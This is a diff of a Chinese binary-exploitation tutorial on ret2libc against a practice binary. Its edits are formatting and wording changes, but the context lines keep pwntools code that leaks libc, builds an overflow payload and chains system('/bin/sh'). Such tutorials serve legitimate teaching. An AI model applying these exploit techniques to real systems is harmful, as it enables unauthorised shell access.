@@ -44,9 +44,9 @@ $ ./vuln-32
 System is at: 0xf7c4f610
 ```
 
-:::info
-你的系统地址可能以不同的字符结尾。这只是说明你用的是不同的 libc 版本。
-:::
+<Note>
+  你的系统地址可能以不同的字符结尾。但这只是说明你用的是不同的 libc 版本。
+</Note>
 
 ## 0x03 利用
 
@@ -63,7 +63,7 @@ libc = elf.libc
 p = process()
 ```
 
-解析 `system` 地址并从中计算 libc 基址（就像我们对 PIE 所做的那样）：
+解析 `system` 地址并从中计算 libc 基址（就像我们对 PIE 所做的那样）。
 
 ```python
 p.recvuntil('at: ')
@@ -73,7 +73,7 @@ libc.address = system_leak - libc.sym['system']
 log.success(f'LIBC base: {hex(libc.address)}')
 ```
 
-现在我们终于可以使用 libc ELF 对象来实现 ret2libc 了：
+现在我们终于可以使用 libc ELF 对象来实现 `ret2libc` 了。
 
 ```python
 payload = flat(
@@ -126,8 +126,6 @@ LINK
 
 ## 0x05 使用 pwntools 优化
 
-你可以将以下 payload 写得更加 pwntoolsy：
-
 ```python
 payload = flat(
     'A' * 32,
@@ -139,7 +137,7 @@ payload = flat(
 p.sendline(payload)
 ```
 
-你可以这样做：
+你可以将上面的 payload 写得更加 pwntoolsy。
 
 ```python
 shell = next(libc.search(b'/bin/sh'))
@@ -151,6 +149,5 @@ rop.system(shell)
 p.sendline(rop.chain())
 ```
 
-这样做的好处是更具可读性，而且也更容易在 64-bit 漏洞利用中重用。因为所有参数都
-会自动为你解析。
+这样做的好处是更具可读性，而且也更容易在 64-bit 漏洞利用中重用。因为所有参数都会自动为你解析。
 
